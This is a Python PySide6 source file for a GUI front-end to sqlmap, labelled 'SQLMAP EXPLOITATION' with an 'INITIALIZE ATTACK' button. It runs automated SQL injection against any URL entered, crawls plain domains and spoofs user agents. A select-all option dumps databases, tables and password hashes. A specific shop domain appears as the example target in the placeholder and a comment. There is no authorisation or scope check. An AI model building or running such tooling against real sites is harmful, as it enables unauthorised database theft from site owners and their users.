from PySide6.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QLabel, QLineEdit, 
    QTextEdit, QApplication, QComboBox, QCheckBox, QFrame
)
from PySide6.QtCore import Qt, QThread, Signal, Slot
from gui.widgets import GlowButton
import subprocess
import os
import sys
import re

class SqlMapWorker(QThread):
    log_signal = Signal(str)
    finished_signal = Signal()

    def __init__(self, target_url, data=None, headers=None, level=1, risk=1, extra_args=[]):
        super().__init__()
        self.target_url = target_url
        self.data = data
        self.headers = headers
        self.level = level
        self.risk = risk
        self.extra_args = extra_args
        self.process = None
        self.is_running = True

    def run(self):
        sqlmap_path = os.path.join(os.getcwd(), "sqlmap-master", "sqlmap.py")
        if not os.path.exists(sqlmap_path):
            self.log_signal.emit(f"<span style='color:#ff0055'>[!] Critical Error: sqlmap.py not found at {sqlmap_path}</span>")
            return

        cmd = [sys.executable, sqlmap_path, "-u", self.target_url, "--batch"]
        cmd.extend(["--level", str(self.level)])
        cmd.extend(["--risk", str(self.risk)])
        
        if self.data:
            cmd.extend(["--data", self.data])
        if self.headers:
            cmd.extend(["--headers", self.headers])
        
        cmd.extend(self.extra_args)

        self.log_signal.emit(f"<span style='color:#00f3ff'>[*] Executing: {' '.join(cmd)}</span>\n")

        try:
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                universal_newlines=True,
                creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
            )

            for line in self.process.stdout:
                if not self.is_running:
                    break
                self.log_signal.emit(line.strip())

            self.process.wait()
        except Exception as e:
            self.log_signal.emit(f"<span style='color:#ff0055'>[!] Process Error: {e}</span>")
        finally:
            self.finished_signal.emit()

    def stop(self):
        self.is_running = False
        if self.process:
            self.process.terminate()
            try:
                self.process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.process.kill()

class SqlMapWidget(QWidget):
    def __init__(self):
        super().__init__()
        self.worker = None
        
        layout = QVBoxLayout(self)
        layout.setSpacing(20)
        layout.setContentsMargins(30, 30, 30, 30)

        # Header
        title = QLabel("💉 SQLMAP EXPLOITATION")
        title.setStyleSheet("color: #FFFFFF; font-weight: 800; font-size: 24pt; letter-spacing: -1px;")
        layout.addWidget(title)

        desc = QLabel("Automated SQL injection engine. Supports all URL formats, including plain domains. If no parameters are detected, --forms and --crawl will be enabled automatically.")
        desc.setWordWrap(True)
        desc.setStyleSheet("color: rgba(255, 255, 255, 0.6); font-size: 11pt; line-height: 1.5;")
        layout.addWidget(desc)

        # Main Input Row (Glassy)
        self.input_frame = QFrame()
        self.input_frame.setObjectName("ContentPanel")
        input_layout = QVBoxLayout(self.input_frame)
        input_layout.setSpacing(15)
        input_layout.setContentsMargins(20, 20, 20, 20)
        
        lbl_target = QLabel("TARGET URL / DOMAIN")
        lbl_target.setStyleSheet("color: #00F3FF; font-weight: bold; text-transform: uppercase; font-size: 9pt; letter-spacing: 1px;")
        
        self.txt_url = QLineEdit()
        self.txt_url.setPlaceholderText("https://www.centeratl.shop/ or centeratl.shop")
        self.txt_url.setStyleSheet("""
            QLineEdit {
                background-color: rgba(255, 255, 255, 0.05);
                color: #FFFFFF;
                border: 1px solid rgba(255, 255, 255, 0.1);
                border-radius: 12px;
                padding: 15px;
                font-size: 12pt;
                font-weight: 500;
            }
            QLineEdit:focus {
                border: 1px solid #00F3FF;
                background-color: rgba(255, 255, 255, 0.08);
            }
        """)
        
        input_layout.addWidget(lbl_target)
        input_layout.addWidget(self.txt_url)
        layout.addWidget(self.input_frame)

        # Advanced Row
        adv_row = QHBoxLayout()
        adv_row.setSpacing(15)
        
        # POST Data
        v_data = QVBoxLayout()
        v_data.addWidget(QLabel("POST DATA:"))
        self.txt_data = QLineEdit()
        self.txt_data.setPlaceholderText("id=1&user=admin")
        v_data.addWidget(self.txt_data)
        adv_row.addLayout(v_data)

        # Headers
        v_headers = QVBoxLayout()
        v_headers.addWidget(QLabel("HEADERS:"))
        self.txt_headers = QLineEdit()
        self.txt_headers.setPlaceholderText("Cookie: security=low")
        v_headers.addWidget(self.txt_headers)
        adv_row.addLayout(v_headers)
        
        layout.addLayout(adv_row)

        # Controls Row
        ctrl_row = QHBoxLayout()
        ctrl_row.setSpacing(15)
        
        self.chk_forms = QCheckBox("--forms")
        self.chk_crawl = QCheckBox("--crawl=2")
        self.chk_random_agent = QCheckBox("--random-agent")
        self.chk_random_agent.setChecked(True)
        
        ctrl_row.addWidget(self.chk_forms)
        ctrl_row.addWidget(self.chk_crawl)
        ctrl_row.addWidget(self.chk_random_agent)
        ctrl_row.addStretch()
        
        self.btn_toggle = GlowButton("INITIALIZE ATTACK", "#00F3FF")
        self.btn_toggle.setFixedWidth(220)
        self.btn_toggle.setFixedHeight(50)
        self.btn_toggle.clicked.connect(self.toggle_attack)
        ctrl_row.addWidget(self.btn_toggle)
        
        layout.addLayout(ctrl_row)

        # Automation Grid (Added Features)
        self.auto_frame = QFrame()
        self.auto_frame.setStyleSheet("""
            QFrame {
                background: rgba(255, 255, 255, 0.03);
                border-radius: 15px;
                border: 1px solid rgba(255, 255, 255, 0.05);
            }
            QCheckBox {
                color: rgba(255, 255, 255, 0.8);
                font-size: 10pt;
            }
            QCheckBox:hover {
                color: #00F3FF;
            }
        """)
        auto_layout = QVBoxLayout(self.auto_frame)
        
        auto_header = QHBoxLayout()
        auto_header.addWidget(QLabel("AUTOMATION SUITE:"))
        self.chk_all = QCheckBox("SELECT ALL")
        self.chk_all.setStyleSheet("color: #00F3FF; font-weight: bold;")
        self.chk_all.toggled.connect(self._toggle_all_checks)
        auto_header.addStretch()
        auto_header.addWidget(self.chk_all)
        auto_layout.addLayout(auto_header)

        grid = QHBoxLayout()
        col1 = QVBoxLayout()
        self.chk_banner = QCheckBox("--banner")
        self.chk_current_user = QCheckBox("--current-user")
        self.chk_current_db = QCheckBox("--current-db")
        self.chk_passwords = QCheckBox("--passwords")
        col1.addWidget(self.chk_banner)
        col1.addWidget(self.chk_current_user)
        col1.addWidget(self.chk_current_db)
        col1.addWidget(self.chk_passwords)
        
        col2 = QVBoxLayout()
        self.chk_dbs = QCheckBox("--dbs")
        self.chk_tables = QCheckBox("--tables")
        self.chk_columns = QCheckBox("--columns")
        self.chk_dump = QCheckBox("--dump")
        col2.addWidget(self.chk_dbs)
        col2.addWidget(self.chk_tables)
        col2.addWidget(self.chk_columns)
        col2.addWidget(self.chk_dump)
        
        grid.addLayout(col1)
        grid.addLayout(col2)
        auto_layout.addLayout(grid)
        layout.addWidget(self.auto_frame)

        # Console
        self.console = QTextEdit()
        self.console.setReadOnly(True)
        self.console.setObjectName("LogConsole")
        from gui.styles import LOG_STYLE
        self.console.setStyleSheet(LOG_STYLE)
        layout.addWidget(self.console, 1)

    def log(self, text):
        self.console.append(text)
        sb = self.console.verticalScrollBar()
        sb.setValue(sb.maximum())

    def _toggle_all_checks(self, checked):
        # Only toggle the automation suite, not crawl/forms
        self.chk_banner.setChecked(checked)
        self.chk_current_user.setChecked(checked)
        self.chk_current_db.setChecked(checked)
        self.chk_passwords.setChecked(checked)
        self.chk_dbs.setChecked(checked)
        self.chk_tables.setChecked(checked)
        self.chk_columns.setChecked(checked)
        self.chk_dump.setChecked(checked)

    def toggle_attack(self):
        if self.worker and self.worker.isRunning():
            self.worker.stop()
            self.btn_toggle.setText("INITIALIZE ATTACK")
        else:
            url = self.txt_url.text().strip()
            if not url: return

            # Link Normalization for centeratl.shop / www.centeratl.shop
            if not url.startswith("http"):
                url = "https://" + url
            
            # Auto-detect "link without params"
            if "?" not in url and not self.chk_forms.isChecked() and not self.chk_crawl.isChecked() and not self.txt_data.text():
                 self.log("<span style='color:#00F3FF'>[*] Plain domain detected. Enabling --forms and --crawl automatically.</span>")
                 self.chk_forms.setChecked(True)
                 self.chk_crawl.setChecked(True)

            self.console.clear()
            self.log(f"<span style='color:#FFFFFF'>[*] Target: {url}</span>")
            
            extra_args = []
            if self.chk_forms.isChecked(): extra_args.append("--forms")
            if self.chk_crawl.isChecked(): extra_args.append("--crawl=2")
            if self.chk_random_agent.isChecked(): extra_args.append("--random-agent")

            # Automation flags
            if self.chk_banner.isChecked(): extra_args.append("--banner")
            if self.chk_current_user.isChecked(): extra_args.append("--current-user")
            if self.chk_current_db.isChecked(): extra_args.append("--current-db")
            if self.chk_passwords.isChecked(): extra_args.append("--passwords")
            if self.chk_dbs.isChecked(): extra_args.append("--dbs")
            if self.chk_tables.isChecked(): extra_args.append("--tables")
            if self.chk_columns.isChecked(): extra_args.append("--columns")
            if self.chk_dump.isChecked(): extra_args.append("--dump")
            
            self.worker = SqlMapWorker(
                target_url=url,
                data=self.txt_data.text().strip(),
                headers=self.txt_headers.text().strip(),
                extra_args=extra_args
            )
            self.worker.log_signal.connect(self.log)
            self.worker.finished_signal.connect(self._on_finished)
            
            self.btn_toggle.setText("ABORT OPERATION")
            self.worker.start()

    def _on_finished(self):
        self.btn_toggle.setText("INITIALIZE ATTACK")
        self.log("<span style='color:rgba(255,255,255,0.4)'>\n[#] Session ended.</span>")
